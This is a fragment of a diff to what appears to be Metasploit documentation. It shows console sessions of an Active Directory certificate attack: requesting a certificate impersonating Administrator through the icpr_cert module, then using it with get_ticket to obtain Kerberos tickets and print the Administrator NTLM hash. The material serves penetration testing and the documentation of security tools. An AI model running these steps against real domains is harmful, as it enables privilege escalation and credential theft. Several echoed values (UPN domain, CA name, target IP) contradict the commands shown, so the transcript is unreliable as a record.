+msf6 auxiliary(admin/kerberos/get_ticket) > get_hash rhost=172.16.199.200 cert_file=//Users/jheysel/.msf4/loot/20250717152134_default_172.16.199.200_windows.ad.cs_383174.pfx username=Administrator domain=kerberos.issue
 [*] Running module against 172.16.199.200
+[!] Warning: Provided principal and realm (Administrator@kerberos.issue) do not match entries in certificate:
+[!]   * Administrator@
 [+] 172.16.199.200:88 - Received a valid TGT-Response
-[*] 172.16.199.200:88 - TGT MIT Credential Cache ticket saved to /Users/jheysel/.msf4/loot/20250603131016_default_172.16.199.200_mit.kerberos.cca_593591.bin
+[*] 172.16.199.200:88 - TGT MIT Credential Cache ticket saved to /Users/jheysel/.msf4/loot/20250717152325_default_172.16.199.200_mit.kerberos.cca_344926.bin
 [*] 172.16.199.200:88 - Getting NTLM hash for Administrator@kerberos.issue
 [+] 172.16.199.200:88 - Received a valid TGS-Response
-[*] 172.16.199.200:88 - TGS MIT Credential Cache ticket saved to /Users/jheysel/.msf4/loot/20250603131016_default_172.16.199.200_mit.kerberos.cca_214080.bin
+[*] 172.16.199.200:88 - TGS MIT Credential Cache ticket saved to /Users/jheysel/.msf4/loot/20250717152325_default_172.16.199.200_mit.kerberos.cca_598018.bin
 [+] Found NTLM hash for Administrator: aad3b435b51404eeaad3b435b51404ee:4fd408d8f8ecb20d4b0768a0ac44b71f
 [*] Auxiliary module execution completed
 ```
@@ -1552,7 +1608,7 @@ msf6 auxiliary(admin/dcerpc/icpr_cert) >  set alt_upn Administrator@kerberos.iss
 alt_upn => Administrator@msf.local
 msf6 auxiliary(admin/dcerpc/icpr_cert) >  set ca kerberos-DC2-CA
 ca => msf-DC3-CA
-msf6 auxiliary(admin/dcerpc/icpr_cert) >  set cert_template ESC9-Template
+msf6 auxiliary(admin/dcerpc/icpr_cert) >  set cert_template User
 cert_template => User
 msf6 auxiliary(admin/dcerpc/icpr_cert) >  set RHOSTS 172.16.199.200
 RHOSTS => 172.16.199.130
